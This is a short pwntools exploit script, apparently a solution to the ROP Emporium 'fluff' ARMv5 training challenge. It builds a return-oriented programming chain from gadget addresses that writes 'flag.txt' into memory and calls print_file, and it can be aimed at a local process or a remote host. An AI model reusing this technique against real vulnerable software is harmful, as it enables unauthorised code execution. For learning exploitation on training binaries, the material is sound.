from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./fluff_armv5")


class ROPS:
    pop_all   = 0x00010658  # pop {r4, r5, r6, r7, r8, sb, sl, pc};
    pop_tre   = 0x000105ec  # pop {r0, r1, r3}; bx r1;
    thumb_str = 0x000103e9  # str r7, [r3, #0x54]; str r6, [r5, #0x44]; bx r0; (THUMB)


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROPS.pop_all,
        0xDEADBEEF,  # r4
        elf.sym.data_start + 4 - 0x44,  # r5
        b".txt",  # r6
        b"flag",  # r7
        0xDEADBEEF,  # r8
        0xDEADBEEF,  # sb
        0xDEADBEEF,  # sl
        ROPS.pop_tre,
        ROPS.pop_tre,  # r0
        ROPS.thumb_str,
        elf.sym.data_start - 0x54,
        elf.sym.data_start,
        elf.plt.print_file,
        0xDEADBEEF
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()
    